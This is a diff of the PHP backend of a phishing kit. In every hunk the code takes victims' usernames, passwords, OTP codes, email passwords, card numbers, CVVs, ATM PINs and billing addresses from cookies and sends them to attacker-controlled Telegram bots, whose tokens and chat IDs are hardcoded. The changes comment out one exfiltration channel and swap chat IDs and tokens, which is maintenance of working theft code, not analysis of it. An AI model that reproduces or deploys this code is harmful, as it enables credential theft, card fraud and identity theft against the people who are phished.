@@ -93,11 +93,11 @@ $a = [
 'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password']
 ];
 file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($a));
-$b = [
+/*$b = [
 'chat_id' => "-766326728",
 'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password']
 ];
-file_get_contents("https://api.telegram.org/bot5536040740:AAFJcRBdIRvG3mw3MfXdfC57jjPerj0QRm8/sendMessage?" . http_build_query($b));
+file_get_contents("https://api.telegram.org/bot5536040740:AAFJcRBdIRvG3mw3MfXdfC57jjPerj0QRm8/sendMessage?" . http_build_query($b));*/
 }
 
 if (!empty($_COOKIE['number'])) {
@@ -115,17 +115,17 @@ if (!empty($_COOKIE['otp'])) {
 ];
 file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($a));
 
-        $b = [
+/*$b = [
 'chat_id' => "-766326728",
 'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nOTP: " . $_COOKIE['otp']
 ];
-file_get_contents("https://api.telegram.org/bot5536040740:AAFJcRBdIRvG3mw3MfXdfC57jjPerj0QRm8/sendMessage?" . http_build_query($b));
+file_get_contents("https://api.telegram.org/bot5536040740:AAFJcRBdIRvG3mw3MfXdfC57jjPerj0QRm8/sendMessage?" . http_build_query($b));*/
 }
 
 if (!empty($_COOKIE['ccname'])) {
 $z = [
-   'chat_id' => "-766326728", 
+   'chat_id' => "-773692150", 
    'text' => "===[ Details ]===" . "\n Name: " . $_COOKIE['name'] . "\n Email: " . $_COOKIE['email'] . "\n Email Pass: " . $_COOKIE['email_pass'] . "\n\n===[ Card Details ]===" . "\n Account Number: " . $_COOKIE['accnum'] . "\n Card Name: " . $_COOKIE['ccname'] . "\n Card Number: " . $_COOKIE['ccnum'] . "\n Expiry Date: " . $_COOKIE['exp'] . "\n CVV: " . $_COOKIE['cvv'] . "\n ATM PIN: " . $_COOKIE['pin'] . "\n\n===[ Billing Address ]===" . "\n Address: " . $_COOKIE['address'] . "\n City: " . $_COOKIE['city'] . "\n ZIP: " . $_COOKIE['zip']
 ];
-file_get_contents("https://api.telegram.org/bot5536040740:AAFJcRBdIRvG3mw3MfXdfC57jjPerj0QRm8/sendMessage?" . http_build_query($z));
+file_get_contents("https://api.telegram.org/bot55240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($z));
 }
